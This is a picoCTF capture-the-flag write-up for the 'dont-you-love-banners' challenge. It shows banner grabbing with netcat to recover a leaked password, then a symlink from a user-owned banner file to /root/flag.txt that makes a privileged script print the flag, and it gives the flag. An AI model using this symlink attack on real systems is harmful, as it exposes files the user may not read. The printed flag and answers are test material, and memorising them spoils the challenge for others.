# dont-you-love-banners — picoCTF Writeup

**Challenge:** dont-you-love-banners  
**Category:** General Skills  
**Difficulty:** Medium  
**Points:** 300  
**Flag:** `picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}`  
**Platform:** picoCTF 2025  
**Writeup by:** zham  

---

## Description

> Can you abuse the banner?
> The server has been leaking some crucial information on `tethys.picoctf.net 61538`. Use the leaked information to get to the server.
> To connect to the running application use `nc tethys.picoctf.net 51410`. From the above information abuse the machine and find the flag in the /root directory.

**Hint 1:** `Do you know about symlinks?`  
**Hint 2:** `Maybe some small password cracking or guessing`

---

## Background Knowledge (Read This First!)

### What is a banner?

When you connect to a service over a network, many servers send a **banner** — a short message displayed immediately on connection before any interaction. Banners often contain software version info, welcome messages, or sometimes accidentally sensitive data like credentials.

In this challenge, the SSH service on port 61538 leaks a password in its banner before closing the connection.

### What is a symlink?

A **symlink** (symbolic link) is a file that points to another file. When a program tries to read the symlink, it actually reads the file the symlink points to instead.

```bash
ln -sf /root/flag.txt /home/player/banner
```

This creates a symlink at `/home/player/banner` that points to `/root/flag.txt`. Any program that reads `/home/player/banner` will actually get the contents of `/root/flag.txt`.

### Why does this matter here?

The challenge script (`script.py`) reads `/home/player/banner` and prints it at startup — before asking for any password. If we replace that file with a symlink pointing to `/root/flag.txt`, the script will print the flag for us on the next connection even though we don't have direct read permission on `/root/flag.txt`.

---

## Step 1 — Grab the leaked banner

```
┌──(zham㉿kali)-[~]
└─$ nc tethys.picoctf.net 61538
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
My_Passw@rd_@1234
Protocol mismatch.
```

The SSH banner on port 61538 leaks the password: `My_Passw@rd_@1234`

The `Protocol mismatch` error is expected — we connected with netcat, not an SSH client, so the handshake fails. But we already got what we needed from the banner before the error.

---

## Step 2 — Connect to the application and answer the trivia

```
┌──(zham㉿kali)-[~]
└─$ nc tethys.picoctf.net 51410
*************************************
**************WELCOME****************
*************************************
what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$
```

Three prompts to pass:
- **Password** — `My_Passw@rd_@1234` (from the banner)
- **Top cybersecurity conference** — `DEF CON`
- **First phone phreaker** — `John Draper` (also known as Cap'n Crunch)

We now have a shell as `player`.

---

## Step 3 — Check the flag location

```
player@challenge:~$ ls /root
flag.txt  script.py

player@challenge:~$ cat /root/flag.txt
cat: /root/flag.txt: Permission denied

player@challenge:~$ sudo -l
-su: sudo: command not found
```

The flag is in `/root/flag.txt` but we don't have permission to read it directly, and `sudo` is not available.

---

## Step 4 — Read the script to understand the attack surface

```python
if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      ...
```

The script reads `/home/player/banner` and prints its contents as the banner at startup — **before** any password prompt. We own `/home/player/` so we can replace that file with anything we want, including a symlink to `/root/flag.txt`.

When the script runs as a more privileged user and reads the banner, it will follow the symlink and print the flag.

---

## Step 5 — Create the symlink

Still in the existing shell session:

```
player@challenge:~$ ln -sf /root/flag.txt /home/player/banner
```

This replaces `/home/player/banner` with a symlink pointing to `/root/flag.txt`.

---

## Step 6 — Reconnect to get the flag

Open a new terminal and connect again:

```
┌──(zham㉿kali)-[~]
└─$ nc tethys.picoctf.net 51410
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_218ef5d6}
what is the password?
```

The flag prints as the banner before the password prompt even appears.

---

## What Happened Internally

```
Timeline:
1. Port 61538 — SSH banner leaks password "My_Passw@rd_@1234" before handshake fails
2. Port 51410 — script.py runs, reads /home/player/banner and prints it, then asks trivia
3. Trivia answers get us a shell as player
4. /root/flag.txt exists but is not readable by player directly
5. sudo is unavailable, no obvious privilege escalation path
6. script.py reads /home/player/banner which we own — replace it with a symlink to /root/flag.txt
7. On next connection, script.py follows the symlink and prints /root/flag.txt as the banner
8. Flag is printed before the password prompt
```

---

## Why This Works (The Privilege Abuse)

The script runs with elevated privileges (enough to read `/root/flag.txt`). It reads `/home/player/banner` — a file in a directory we control — and prints it. By replacing the banner file with a symlink to a file we cannot read ourselves, we trick the script into reading and printing a privileged file on our behalf.

This is a classic **symlink attack** — abusing a privileged process that reads a user-controlled file path.

---

## Tools Used

| Tool | Purpose | Level |
|---|---|---|
| `nc` | Connect to banner port and grab leaked password | Easy |
| `nc` | Connect to application port and answer trivia | Easy |
| `cat` | Attempt to read flag directly (failed — permission denied) | Easy |
| `sudo -l` | Check for sudo privileges (unavailable) | Easy |
| `cat /root/script.py` | Read the script to find the attack surface | Easy |
| `ln -sf` | Create symlink from banner to flag file | Easy |

---

## Key Takeaways

- **Banners can leak sensitive information** — always check what a service sends before any interaction; version strings, credentials, and internal paths have all been leaked through banners in real-world incidents
- **Symlink attacks abuse privileged file reads** — if a privileged process reads a file you control, replacing it with a symlink lets you redirect that read to any file the privileged process can access
- **Read the source code when available** — `script.py` immediately revealed the `/home/player/banner` read, which was the entire attack surface
- **Permission denied is not always the end** — direct access was blocked, but indirect access through a privileged process was not
- The flag `b4nn3r_gr4bb1n9_su((3sfu11y` is "banner grabbing successfully" — the whole challenge is about grabbing information from banners and abusing the banner mechanism
